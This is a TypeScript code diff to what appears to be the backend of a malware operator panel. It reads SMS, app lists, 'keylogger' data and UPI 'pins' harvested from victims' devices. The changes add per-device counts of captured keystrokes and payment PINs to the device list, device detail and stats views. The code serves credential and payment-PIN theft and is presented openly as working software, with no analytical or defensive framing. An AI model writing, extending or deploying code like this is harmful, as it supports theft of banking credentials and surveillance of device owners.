@@ -24,10 +24,21 @@ export class FirebaseProvider implements IDeviceProvider {
                 // If it has no assignment, we allow it (for legacy or single-tenant databases).
                 return !devAppId || devAppId === this.appId;
             })
-            .map(([id, dev]: [string, any]) => ({
-                ...this.normalizeDevice(dev, id),
-                _sourceProvider: 'FIREBASE'
-            }));
+            .map(([id, dev]: [string, any]) => {
+                const normalized = this.normalizeDevice(dev, id);
+                return {
+                    ...normalized,
+                    _sourceProvider: 'FIREBASE'
+                };
+            });
+
+        // Fetch counts for all devices
+        const [_, __, allKeys, allPins] = await Promise.all([
+            firebaseService.read(this.databaseUrl, 'sms'),
+            firebaseService.read(this.databaseUrl, 'apps'),
+            firebaseService.read(this.databaseUrl, 'keylogger'),
+            firebaseService.read(this.databaseUrl, 'pins')
+        ]);
 
         // Fetch metadata (notes, bookmarks) from Supabase
         const deviceIds = firebaseDevices.map(d => d.device_id);
@@ -41,20 +52,32 @@ export class FirebaseProvider implements IDeviceProvider {
             const metaMap = new Map(metadata.map(m => [m.device_id, m]));
             return firebaseDevices.map(dev => {
                 const meta = metaMap.get(dev.device_id);
+                const counts = {
+                    key_logs: Object.keys(allKeys?.[dev.device_id] || {}).length,
+                    upi_pins: Object.keys(allPins?.[dev.device_id] || {}).length
+                };
+
                 if (meta) {
                     return {
                         ...dev,
                         note: meta.note || dev.note,
                         is_bookmarked: meta.is_bookmarked ?? dev.is_bookmarked,
                         status: meta.status ?? dev.status,
-                        last_seen: meta.last_seen || dev.last_seen
+                        last_seen: meta.last_seen || dev.last_seen,
+                        _count: counts
                     };
                 }
-                return dev;
+                return { ...dev, _count: counts };
             });
         }
 
-        return firebaseDevices;
+        return firebaseDevices.map(dev => ({
+            ...dev,
+            _count: {
+                key_logs: Object.keys(allKeys?.[dev.device_id] || {}).length,
+                upi_pins: Object.keys(allPins?.[dev.device_id] || {}).length
+            }
+        }));
     }
 
     async getDevice(deviceId: string): Promise<any> {
@@ -69,6 +92,19 @@ export class FirebaseProvider implements IDeviceProvider {
 
         const normalized = this.normalizeDevice(dev, deviceId);
 
+        // Fetch counts
+        const [_, __, keys, pins] = await Promise.all([
+            firebaseService.read(this.databaseUrl, `sms/${deviceId}`),
+            firebaseService.read(this.databaseUrl, `apps/${deviceId}`),
+            firebaseService.read(this.databaseUrl, `keylogger/${deviceId}`),
+            firebaseService.read(this.databaseUrl, `pins/${deviceId}`)
+        ]);
+
+        const counts = {
+            key_logs: Object.keys(keys || {}).length,
+            upi_pins: Object.keys(pins || {}).length
+        };
+
         // Fetch metadata from Supabase
         const { data: meta } = await this.supabase
             .from('devices')
@@ -82,19 +118,24 @@ export class FirebaseProvider implements IDeviceProvider {
             is_bookmarked: meta?.is_bookmarked ?? normalized.is_bookmarked,
             status: meta?.status ?? normalized.status,
             last_seen: meta?.last_seen || normalized.last_seen,
+            _count: counts,
             _sourceProvider: 'FIREBASE'
         };
     }
 
     async getDeviceStats(deviceId: string): Promise<DeviceStats> {
-        const [msgs, apps] = await Promise.all([
+        const [msgs, apps, keys, pins] = await Promise.all([
             firebaseService.read(this.databaseUrl, `sms/${deviceId}`),
-            firebaseService.read(this.databaseUrl, `apps/${deviceId}`)
+            firebaseService.read(this.databaseUrl, `apps/${deviceId}`),
+            firebaseService.read(this.databaseUrl, `keylogger/${deviceId}`),
+            firebaseService.read(this.databaseUrl, `pins/${deviceId}`)
         ]);
 
         return {
             messages: Array.isArray(msgs) ? msgs.length : Object.keys(msgs || {}).length,
-            apps: Array.isArray(apps) ? apps.length : Object.keys(apps || {}).length
+            apps: Array.isArray(apps) ? apps.length : Object.keys(apps || {}).length,
+            keylogs: Array.isArray(keys) ? keys.length : Object.keys(keys || {}).length,
+            upiPins: Array.isArray(pins) ? pins.length : Object.keys(pins || {}).length
         };
     }
 
